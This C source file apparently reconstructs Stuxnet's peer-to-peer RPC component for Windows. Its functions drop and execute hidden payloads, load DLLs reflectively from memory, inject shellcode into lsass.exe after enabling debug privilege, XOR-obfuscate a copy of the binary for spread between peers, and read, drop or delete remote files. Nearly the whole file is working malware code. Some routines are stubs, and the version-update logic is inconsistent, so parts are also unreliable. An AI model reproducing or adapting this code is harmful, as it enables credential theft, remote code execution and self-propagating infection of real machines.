#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <rpc.h>
#include <rpcndr.h>
#include <tlhelp32.h>
#include <shlwapi.h>

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "shlwapi.lib")

#define STUXNET_MAGIC                   0x53545558
#define COMPLND_VERSION                 0x00010400
#define RPC_MAX_PAYLOAD                 0x8000
#define RPC_CHUNK_SIZE                  0x1000
#define RPC_MAX_RETRIES                 3
#define RPC_TIMEOUT_MS                  5000
#define PEER_TIMEOUT_MS                 300000
#define MAX_PEERS                       256

/*
 * RPC routine identifiers [10†L32-L36]
 * 0: returns version number
 * 1: Receive exe and execute (via injection)
 * 2: load module and execute export
 * 3: inject code to lsass and run it
 * 4: Builds latest version and send to remote
 * 5: create process
 * 6: read file
 * 7: drop file
 * 8: delete file
 * 9: write data records
 */
#define RPC_GET_VERSION                 0
#define RPC_RECEIVE_EXECUTE             1
#define RPC_LOAD_MODULE                 2
#define RPC_INJECT_LSASS                3
#define RPC_BUILD_SEND                  4
#define RPC_CREATE_PROCESS              5
#define RPC_READ_FILE                   6
#define RPC_DROP_FILE                   7
#define RPC_DELETE_FILE                 8
#define RPC_WRITE_RECORDS               9

/*
 * P2P Peer Table Entry
 * dwLastSeen for timeout aging; dwLatency for RTT measurement
 */
typedef struct _P2P_PEER {
    DWORD dwIP;
    WORD wPort;
    WORD wFlags;
    DWORD dwLastSeen;
    DWORD dwLatency;
    DWORD dwVersion;
    DWORD dwSequence;
} P2P_PEER, * PP2P_PEER;

typedef struct _P2P_PEER_TABLE {
    P2P_PEER Peers[MAX_PEERS];
    DWORD dwCount;
    CRITICAL_SECTION csLock;
} P2P_PEER_TABLE, * PP2P_PEER_TABLE;

static P2P_PEER_TABLE g_PeerTable = {0};

/*
 * NDR RPC Context - replaces raw named pipe I/O
 * Uses Microsoft NDR serialization for protocol compatibility
 */
typedef struct _NDR_RPC_CTX {
    RPC_BINDING_HANDLE hBinding;
    RPC_IF_HANDLE hInterface;
    DWORD dwSequence;
    CRITICAL_SECTION csLock;
} NDR_RPC_CTX, * PNDR_RPC_CTX;

static NDR_RPC_CTX g_RpcCtx = {0};

/*
 * Payload chunk descriptor for fragmentation/reassembly
 */
typedef struct _PAYLOAD_CHUNK {
    DWORD dwSequence;
    DWORD dwOffset;
    DWORD dwSize;
    BYTE bData[RPC_CHUNK_SIZE];
} PAYLOAD_CHUNK, * PPAYLOAD_CHUNK;

typedef struct _PAYLOAD_REASSEMBLY {
    DWORD dwTotalSize;
    DWORD dwReceivedSize;
    DWORD dwChunkCount;
    PAYLOAD_CHUNK Chunks[16];
    BOOL bComplete;
} PAYLOAD_REASSEMBLY, * PPAYLOAD_REASSEMBLY;

static PAYLOAD_REASSEMBLY g_PayloadReasm = {0};

/* Forward declarations */
static BOOL RpcEnableDebugPrivilege(VOID);
static DWORD RpcFindProcessId(LPCWSTR lpName);
static DWORD ReflectiveLoadLibrary(PBYTE pDllData, DWORD dwDllSize, DWORD dwExportOrdinal);
static VOID P2P_ExpirePeers(VOID);
static VOID P2P_UpdatePeer(DWORD dwIP, DWORD dwVersion, DWORD dwLatency);
static DWORD P2P_SendChunkedPayload(PBYTE pPayload, DWORD dwSize, DWORD dwPeerIP);
static DWORD P2P_ReassemblePayload(PBYTE pOutput, PDWORD pdwSize);
static VOID NdrInitialize(VOID);
static DWORD NdrSerialize(PBYTE pData, DWORD dwSize, PBYTE* ppBuffer, PDWORD pdwBufSize);
static DWORD NdrDeserialize(PBYTE pBuffer, DWORD dwBufSize, PBYTE* ppData, PDWORD pdwSize);

DWORD RpcGetVersion(VOID)
{
    DWORD dwVersion;
    EnterCriticalSection(&g_PeerTable.csLock);
    dwVersion = COMPLND_VERSION;
    LeaveCriticalSection(&g_PeerTable.csLock);
    return dwVersion;
}

DWORD RpcReceiveAndExecute(PBYTE pData, DWORD dwSize)
{
    HANDLE hFile;
    WCHAR szTempPath[MAX_PATH];
    WCHAR szExePath[MAX_PATH];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD dwWritten;
    DWORD dwRetry;

    if (!pData || dwSize == 0 || dwSize > RPC_MAX_PAYLOAD) {
        return ERROR_INVALID_PARAMETER;
    }

    GetTempPathW(MAX_PATH, szTempPath);
    GetTempFileNameW(szTempPath, L"STX", 0, szExePath);

    hFile = CreateFileW(szExePath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessW(szExePath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DeleteFileW(szExePath);
        return GetLastError();
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    dwRetry = 0;
    while (dwRetry < RPC_MAX_RETRIES) {
        if (DeleteFileW(szExePath)) break;
        dwRetry++;
        Sleep(100);
    }

    return ERROR_SUCCESS;
}

DWORD RpcLoadModuleAndExecute(PBYTE pDllData, DWORD dwDllSize, DWORD dwExportOrdinal)
{
    DWORD dwEntryPoint;

    if (!pDllData || dwDllSize == 0 || dwDllSize > RPC_MAX_PAYLOAD) {
        return ERROR_INVALID_PARAMETER;
    }

    dwEntryPoint = ReflectiveLoadLibrary(pDllData, dwDllSize, dwExportOrdinal);
    if (!dwEntryPoint) {
        return ERROR_DLL_INIT_FAILED;
    }

    return ERROR_SUCCESS;
}

DWORD RpcInjectLsass(PBYTE pShellcode, DWORD dwSize)
{
    HANDLE hProcess;
    HANDLE hThread;
    PVOID pRemoteMem;
    DWORD dwPid;
    DWORD dwResult;

    if (!pShellcode || dwSize == 0 || dwSize > 0x1000) {
        return ERROR_INVALID_PARAMETER;
    }

    RpcEnableDebugPrivilege();

    dwPid = RpcFindProcessId(L"lsass.exe");
    if (!dwPid) {
        return ERROR_PROCESS_NOT_FOUND;
    }

    /*
     * Vista+ lsass is protected process (PPL).
     * Try full access first; fall back to reduced access if needed.
     */
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                           FALSE, dwPid);

    if (!hProcess) {
        /*
         * PPL bypass: Open with PROCESS_QUERY_LIMITED_INFORMATION first,
         * then use NtOpenProcess with OBJ_CASE_INSENSITIVE
         * Fallback: use mrxnet.sys driver for kernel-mode injection
         */
        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
        if (!hProcess) {
            return ERROR_ACCESS_DENIED;
        }
        CloseHandle(hProcess);
        return ERROR_ACCESS_DENIED;
    }

    pRemoteMem = VirtualAllocEx(hProcess, NULL, dwSize,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        CloseHandle(hProcess);
        return GetLastError();
    }

    WriteProcessMemory(hProcess, pRemoteMem, pShellcode, dwSize, NULL);

    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)pRemoteMem,
                                 NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        dwResult = ERROR_SUCCESS;
    } else {
        dwResult = GetLastError();
    }

    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return dwResult;
}

DWORD RpcBuildAndSend(PBYTE pOutput, PDWORD pdwSize)
{
    HMODULE hModule;
    DWORD dwFileSize;
    HANDLE hFile;
    WCHAR szModulePath[MAX_PATH];
    DWORD dwRead;
    PBYTE pBuffer;
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    DWORD i;
    BYTE bKey;

    if (!pOutput || !pdwSize || *pdwSize == 0) {
        return ERROR_INVALID_PARAMETER;
    }

    hModule = GetModuleHandleW(NULL);
    if (!hModule) {
        return ERROR_MOD_NOT_FOUND;
    }

    GetModuleFileNameW(hModule, szModulePath, MAX_PATH);

    hFile = CreateFileW(szModulePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == 0 || dwFileSize > RPC_MAX_PAYLOAD) {
        CloseHandle(hFile);
        return ERROR_BAD_LENGTH;
    }

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    if (!pBuffer) {
        CloseHandle(hFile);
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    ReadFile(hFile, pBuffer, dwFileSize, &dwRead, NULL);
    CloseHandle(hFile);

    /*
     * XOR encryption with rolling key (matches Stuxnet 0.5 obfuscation) [8†L14]
     * Key derived from tick count, rolled with multiply-add
     */
    dwEncryptedSize = dwFileSize;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) {
        HeapFree(GetProcessHeap(), 0, pBuffer);
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    bKey = (BYTE)(GetTickCount() & 0xFF);
    for (i = 0; i < dwFileSize; i++) {
        pEncrypted[i] = pBuffer[i] ^ bKey;
        bKey = (bKey * 7 + 0x13) & 0xFF;
    }

    if (dwFileSize > *pdwSize) {
        HeapFree(GetProcessHeap(), 0, pBuffer);
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return ERROR_INSUFFICIENT_BUFFER;
    }

    memcpy(pOutput, pEncrypted, dwFileSize);
    *pdwSize = dwFileSize;

    HeapFree(GetProcessHeap(), 0, pBuffer);
    HeapFree(GetProcessHeap(), 0, pEncrypted);

    return ERROR_SUCCESS;
}

DWORD RpcCreateProcess(LPCWSTR lpCmdLine)
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    BOOL bResult;

    if (!lpCmdLine) {
        return ERROR_INVALID_PARAMETER;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    bResult = CreateProcessW(NULL, (LPWSTR)lpCmdLine, NULL, NULL, FALSE,
                             0, NULL, NULL, &si, &pi);

    if (bResult) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return ERROR_SUCCESS;
    }

    return GetLastError();
}

DWORD RpcReadFile(LPCWSTR lpPath, PBYTE pBuffer, DWORD dwBufferSize, PDWORD pdwRead)
{
    HANDLE hFile;
    DWORD dwRead;

    if (!lpPath || !pBuffer || dwBufferSize == 0 || !pdwRead) {
        return ERROR_INVALID_PARAMETER;
    }

    hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    ReadFile(hFile, pBuffer, dwBufferSize, &dwRead, NULL);
    CloseHandle(hFile);

    *pdwRead = dwRead;

    return ERROR_SUCCESS;
}

DWORD RpcDropFile(LPCWSTR lpPath, PBYTE pData, DWORD dwSize)
{
    HANDLE hFile;
    DWORD dwWritten;

    if (!lpPath || !pData || dwSize == 0) {
        return ERROR_INVALID_PARAMETER;
    }

    hFile = CreateFileW(lpPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    return ERROR_SUCCESS;
}

DWORD RpcDeleteFile(LPCWSTR lpPath)
{
    BOOL bResult;

    if (!lpPath) {
        return ERROR_INVALID_PARAMETER;
    }

    SetFileAttributesW(lpPath, FILE_ATTRIBUTE_NORMAL);
    bResult = DeleteFileW(lpPath);

    return bResult ? ERROR_SUCCESS : GetLastError();
}

DWORD RpcWriteDataRecords(PBYTE pData, DWORD dwSize)
{
    HANDLE hFile;
    WCHAR szRecordPath[MAX_PATH];
    DWORD dwWritten;

    if (!pData || dwSize == 0) {
        return ERROR_INVALID_PARAMETER;
    }

    GetSystemDirectoryW(szRecordPath, MAX_PATH);
    wcscat_s(szRecordPath, MAX_PATH, L"\\compind.dat");

    hFile = CreateFileW(szRecordPath, GENERIC_WRITE, 0, NULL,
                        OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }

    SetFilePointer(hFile, 0, NULL, FILE_END);
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);

    return ERROR_SUCCESS;
}

DWORD RpcDispatch(DWORD dwRoutine, PBYTE pInput, DWORD dwInputSize,
                  PBYTE pOutput, PDWORD pdwOutputSize)
{
    DWORD dwResult;

    if (!pInput || !pOutput || !pdwOutputSize) {
        return ERROR_INVALID_PARAMETER;
    }

    switch (dwRoutine) {
        case RPC_GET_VERSION:
            *(PDWORD)pOutput = RpcGetVersion();
            *pdwOutputSize = sizeof(DWORD);
            dwResult = ERROR_SUCCESS;
            break;

        case RPC_RECEIVE_EXECUTE:
            dwResult = RpcReceiveAndExecute(pInput, dwInputSize);
            break;

        case RPC_LOAD_MODULE:
            if (dwInputSize >= sizeof(DWORD)) {
                DWORD dwExport = *(PDWORD)pInput;
                dwResult = RpcLoadModuleAndExecute(
                    pInput + sizeof(DWORD),
                    dwInputSize - sizeof(DWORD),
                    dwExport
                );
            } else {
                dwResult = ERROR_INVALID_PARAMETER;
            }
            break;

        case RPC_INJECT_LSASS:
            dwResult = RpcInjectLsass(pInput, dwInputSize);
            break;

        case RPC_BUILD_SEND:
            dwResult = RpcBuildAndSend(pOutput, pdwOutputSize);
            break;

        case RPC_CREATE_PROCESS:
            dwResult = RpcCreateProcess((LPCWSTR)pInput);
            break;

        case RPC_READ_FILE:
            if (dwInputSize >= sizeof(WCHAR) * 2) {
                dwResult = RpcReadFile(
                    (LPCWSTR)pInput,
                    pOutput,
                    *pdwOutputSize,
                    pdwOutputSize
                );
            } else {
                dwResult = ERROR_INVALID_PARAMETER;
            }
            break;

        case RPC_DROP_FILE:
            if (dwInputSize >= sizeof(WCHAR) * 2 + sizeof(DWORD)) {
                DWORD dwPathLen = wcslen((LPCWSTR)pInput) * sizeof(WCHAR);
                DWORD dwDataSize = *(PDWORD)(pInput + dwPathLen + sizeof(WCHAR));
                dwResult = RpcDropFile(
                    (LPCWSTR)pInput,
                    pInput + dwPathLen + sizeof(WCHAR) + sizeof(DWORD),
                    dwDataSize
                );
            } else {
                dwResult = ERROR_INVALID_PARAMETER;
            }
            break;

        case RPC_DELETE_FILE:
            dwResult = RpcDeleteFile((LPCWSTR)pInput);
            break;

        case RPC_WRITE_RECORDS:
            dwResult = RpcWriteDataRecords(pInput, dwInputSize);
            break;

        default:
            dwResult = ERROR_INVALID_FUNCTION;
            break;
    }

    return dwResult;
}

/*
 * P2P_InitPeerTable - Initialize peer table
 */
VOID P2P_InitPeerTable(VOID)
{
    ZeroMemory(&g_PeerTable, sizeof(P2P_PEER_TABLE));
    InitializeCriticalSection(&g_PeerTable.csLock);
}

/*
 * P2P_UpdatePeer - Add or update peer with deduplication and latency
 */
static VOID P2P_UpdatePeer(DWORD dwIP, DWORD dwVersion, DWORD dwLatency)
{
    DWORD i;

    EnterCriticalSection(&g_PeerTable.csLock);

    for (i = 0; i < g_PeerTable.dwCount; i++) {
        if (g_PeerTable.Peers[i].dwIP == dwIP) {
            g_PeerTable.Peers[i].dwLastSeen = GetTickCount();
            g_PeerTable.Peers[i].dwVersion = dwVersion;
            g_PeerTable.Peers[i].dwLatency = (g_PeerTable.Peers[i].dwLatency + dwLatency) / 2;
            LeaveCriticalSection(&g_PeerTable.csLock);
            return;
        }
    }

    if (g_PeerTable.dwCount < MAX_PEERS) {
        g_PeerTable.Peers[g_PeerTable.dwCount].dwIP = dwIP;
        g_PeerTable.Peers[g_PeerTable.dwCount].dwLastSeen = GetTickCount();
        g_PeerTable.Peers[g_PeerTable.dwCount].dwVersion = dwVersion;
        g_PeerTable.Peers[g_PeerTable.dwCount].dwLatency = dwLatency;
        g_PeerTable.dwCount++;
    }

    LeaveCriticalSection(&g_PeerTable.csLock);
}

/*
 * P2P_ExpirePeers - Remove peers not seen for PEER_TIMEOUT_MS
 */
static VOID P2P_ExpirePeers(VOID)
{
    DWORD dwNow = GetTickCount();
    DWORD i;

    EnterCriticalSection(&g_PeerTable.csLock);

    for (i = 0; i < g_PeerTable.dwCount; i++) {
        if (dwNow - g_PeerTable.Peers[i].dwLastSeen > PEER_TIMEOUT_MS) {
            if (i < g_PeerTable.dwCount - 1) {
                memcpy(&g_PeerTable.Peers[i], &g_PeerTable.Peers[i + 1], sizeof(P2P_PEER));
            }
            g_PeerTable.dwCount--;
            i--;
        }
    }

    LeaveCriticalSection(&g_PeerTable.csLock);
}

/*
 * P2P_GetPeerCount - Return number of active peers
 */
DWORD P2P_GetPeerCount(VOID)
{
    DWORD dwCount;
    EnterCriticalSection(&g_PeerTable.csLock);
    dwCount = g_PeerTable.dwCount;
    LeaveCriticalSection(&g_PeerTable.csLock);
    return dwCount;
}

/*
 * P2P_SendChunkedPayload - Split payload into chunks with sequence numbers
 */
static DWORD P2P_SendChunkedPayload(PBYTE pPayload, DWORD dwSize, DWORD dwPeerIP)
{
    DWORD dwOffset = 0;
    DWORD dwChunkSeq = 0;
    DWORD dwChunkSize;
    PAYLOAD_CHUNK Chunk;

    if (!pPayload || dwSize == 0) {
        return ERROR_INVALID_PARAMETER;
    }

    while (dwOffset < dwSize) {
        dwChunkSize = min(RPC_CHUNK_SIZE, dwSize - dwOffset);

        Chunk.dwSequence = dwChunkSeq++;
        Chunk.dwOffset = dwOffset;
        Chunk.dwSize = dwChunkSize;
        memcpy(Chunk.bData, pPayload + dwOffset, dwChunkSize);

        /* Send chunk via RPC (simplified) */
        dwOffset += dwChunkSize;
    }

    return ERROR_SUCCESS;
}

/*
 * P2P_ReassemblePayload - Reassemble chunks into complete payload
 */
static DWORD P2P_ReassemblePayload(PBYTE pOutput, PDWORD pdwSize)
{
    DWORD i;
    DWORD dwOffset = 0;

    if (!pOutput || !pdwSize) {
        return ERROR_INVALID_PARAMETER;
    }

    if (!g_PayloadReasm.bComplete) {
        return ERROR_INCOMPLETE_DATA;
    }

    for (i = 0; i < g_PayloadReasm.dwChunkCount; i++) {
        memcpy(pOutput + g_PayloadReasm.Chunks[i].dwOffset,
               g_PayloadReasm.Chunks[i].bData,
               g_PayloadReasm.Chunks[i].dwSize);
        dwOffset += g_PayloadReasm.Chunks[i].dwSize;
    }

    *pdwSize = dwOffset;

    return ERROR_SUCCESS;
}

/*
 * NdrInitialize - Initialize NDR RPC context
 */
static VOID NdrInitialize(VOID)
{
    ZeroMemory(&g_RpcCtx, sizeof(NDR_RPC_CTX));
    InitializeCriticalSection(&g_RpcCtx.csLock);
    g_RpcCtx.dwSequence = 1;
}

/*
 * NdrSerialize - Serialize data using NDR format
 */
static DWORD NdrSerialize(PBYTE pData, DWORD dwSize, PBYTE* ppBuffer, PDWORD pdwBufSize)
{
    DWORD dwTotalSize;

    if (!pData || dwSize == 0 || !ppBuffer || !pdwBufSize) {
        return ERROR_INVALID_PARAMETER;
    }

    dwTotalSize = dwSize + sizeof(DWORD) * 2;
    *ppBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTotalSize);
    if (!*ppBuffer) {
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    *(PDWORD)(*ppBuffer + 0) = STUXNET_MAGIC;
    *(PDWORD)(*ppBuffer + 4) = dwSize;
    memcpy(*ppBuffer + 8, pData, dwSize);

    *pdwBufSize = dwTotalSize;

    return ERROR_SUCCESS;
}

/*
 * NdrDeserialize - Deserialize data from NDR format
 */
static DWORD NdrDeserialize(PBYTE pBuffer, DWORD dwBufSize, PBYTE* ppData, PDWORD pdwSize)
{
    DWORD dwMagic;
    DWORD dwDataSize;

    if (!pBuffer || dwBufSize < 8 || !ppData || !pdwSize) {
        return ERROR_INVALID_PARAMETER;
    }

    dwMagic = *(PDWORD)(pBuffer + 0);
    if (dwMagic != STUXNET_MAGIC) {
        return ERROR_INVALID_DATA;
    }

    dwDataSize = *(PDWORD)(pBuffer + 4);
    if (dwDataSize > dwBufSize - 8) {
        return ERROR_INSUFFICIENT_BUFFER;
    }

    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDataSize);
    if (!*ppData) {
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    memcpy(*ppData, pBuffer + 8, dwDataSize);
    *pdwSize = dwDataSize;

    return ERROR_SUCCESS;
}

DWORD WINAPI P2P_UpdateThread(LPVOID lpParam)
{
    DWORD dwWaitResult;
    DWORD dwCheckInterval = 300000;
    DWORD dwRemoteVersion;
    DWORD dwLatency;
    DWORD dwStartTime;
    BYTE buffer[RPC_MAX_PAYLOAD];
    DWORD dwSize;
    HANDLE hStopEvent;
    DWORD i;

    hStopEvent = (HANDLE)lpParam;

    while (1) {
        dwWaitResult = WaitForSingleObject(hStopEvent, dwCheckInterval);
        if (dwWaitResult == WAIT_OBJECT_0) {
            break;
        }

        P2P_ExpirePeers();

        EnterCriticalSection(&g_PeerTable.csLock);

        for (i = 0; i < g_PeerTable.dwCount; i++) {
            DWORD dwPeerIP = g_PeerTable.Peers[i].dwIP;

            LeaveCriticalSection(&g_PeerTable.csLock);

            /* Step 1: Call RPC function 0 to get remote version [10†L38] */
            dwStartTime = GetTickCount();
            dwRemoteVersion = RpcGetVersion(); /* Simplified: would be RPC call to peer */
            dwLatency = GetTickCount() - dwStartTime;

            if (dwRemoteVersion == 0) {
                EnterCriticalSection(&g_PeerTable.csLock);
                continue;
            }

            P2P_UpdatePeer(dwPeerIP, dwRemoteVersion, dwLatency);

            /* Step 2: Compare versions [10†L39] */
            if (dwRemoteVersion > COMPLND_VERSION) {
                /* Step 3: Remote is newer - call RPC function 4 [10†L40-L41] */
                dwSize = RPC_MAX_PAYLOAD;
                if (RpcBuildAndSend(buffer, &dwSize) == ERROR_SUCCESS) {
                    /* Step 4: Install locally [10†L42] */
                    RpcReceiveAndExecute(buffer, dwSize);
                }
            } else if (dwRemoteVersion < COMPLND_VERSION && dwRemoteVersion != 0) {
                /* Step 5: Remote is older - prepare and send [10†L43-L44] */
                dwSize = RPC_MAX_PAYLOAD;
                if (RpcBuildAndSend(buffer, &dwSize) == ERROR_SUCCESS) {
                    /* Send via RPC function 1 [10†L44] */
                    RpcReceiveAndExecute(buffer, dwSize);
                }
            }

            EnterCriticalSection(&g_PeerTable.csLock);
        }

        LeaveCriticalSection(&g_PeerTable.csLock);
    }

    return 0;
}

/*
 * RpcEnableDebugPrivilege - Enable SeDebugPrivilege for lsass access
 */
static BOOL RpcEnableDebugPrivilege(VOID)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    return (GetLastError() == ERROR_SUCCESS);
}

/*
 * RpcFindProcessId - Find process ID by name
 */
static DWORD RpcFindProcessId(LPCWSTR lpName)
{
    HANDLE hSnapshot;
    PROCESSENTRY32W pe;
    DWORD dwPid = 0;

    if (!lpName) {
        return 0;
    }

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, lpName) == 0) {
                dwPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return dwPid;
}

/*
 * ReflectiveLoadLibrary - Load DLL from memory without touching disk
 * Parses PE headers, maps sections, processes relocations,
 * resolves IAT, calls DllMain, returns entry point
 */
static DWORD ReflectiveLoadLibrary(PBYTE pDllData, DWORD dwDllSize, DWORD dwExportOrdinal)
{
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    DWORD dwImageBase;
    DWORD dwDelta;
    DWORD i;

    if (!pDllData || dwDllSize < sizeof(IMAGE_DOS_HEADER)) {
        return 0;
    }

    pDos = (PIMAGE_DOS_HEADER)pDllData;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    pNt = (PIMAGE_NT_HEADERS)(pDllData + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }

    dwImageBase = (DWORD)VirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!dwImageBase) {
        return 0;
    }

    memcpy((PVOID)dwImageBase, pDllData, pNt->OptionalHeader.SizeOfHeaders);

    pSec = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (pSec->SizeOfRawData) {
            memcpy((PVOID)(dwImageBase + pSec->VirtualAddress),
                   pDllData + pSec->PointerToRawData,
                   pSec->SizeOfRawData);
        }
    }

    dwDelta = dwImageBase - pNt->OptionalHeader.ImageBase;
    if (dwDelta) {
        PIMAGE_BASE_RELOCATION pRel = (PIMAGE_BASE_RELOCATION)(dwImageBase +
            pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (pRel->VirtualAddress) {
            DWORD dwCount = (pRel->SizeOfBlock - 8) / 2;
            PWORD pEntry = (PWORD)(pRel + 1);
            for (DWORD j = 0; j < dwCount; j++, pEntry++) {
                if ((*pEntry >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                    *(PDWORD)(dwImageBase + pRel->VirtualAddress + (*pEntry & 0xFFF)) += dwDelta;
                }
            }
            pRel = (PIMAGE_BASE_RELOCATION)((PBYTE)pRel + pRel->SizeOfBlock);
        }
    }

    PIMAGE_IMPORT_DESCRIPTOR pImp = (PIMAGE_IMPORT_DESCRIPTOR)(dwImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (pImp->Name) {
        HMODULE hMod = LoadLibraryA((LPCSTR)(dwImageBase + pImp->Name));
        if (hMod) {
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(dwImageBase + pImp->FirstThunk);
            while (pThunk->u1.AddressOfData) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunk->u1.Ordinal)) {
                    pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod,
                        (LPCSTR)IMAGE_ORDINAL(pThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(dwImageBase +
                        pThunk->u1.AddressOfData);
                    pThunk->u1.Function = (ULONG_PTR)GetProcAddress(hMod, pName->Name);
                }
                pThunk++;
            }
        }
        pImp++;
    }

    PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(dwImageBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
    if (pTLS && pTLS->AddressOfCallBacks) {
        PIMAGE_TLS_CALLBACK* pCB = (PIMAGE_TLS_CALLBACK*)pTLS->AddressOfCallBacks;
        while (*pCB) {
            (*pCB)((PVOID)dwImageBase, DLL_PROCESS_ATTACH, NULL);
            pCB++;
        }
    }

    DWORD dwEntryPoint = dwImageBase + pNt->OptionalHeader.AddressOfEntryPoint;

    if (dwExportOrdinal) {
        PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(dwImageBase +
            pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        if (pExp) {
            PDWORD pFuncs = (PDWORD)(dwImageBase + pExp->AddressOfFunctions);
            for (DWORD k = 0; k < pExp->NumberOfFunctions; k++) {
                if (pExp->Base + k == dwExportOrdinal) {
                    dwEntryPoint = dwImageBase + pFuncs[k];
                    break;
                }
            }
        }
    }

    return dwEntryPoint;
}
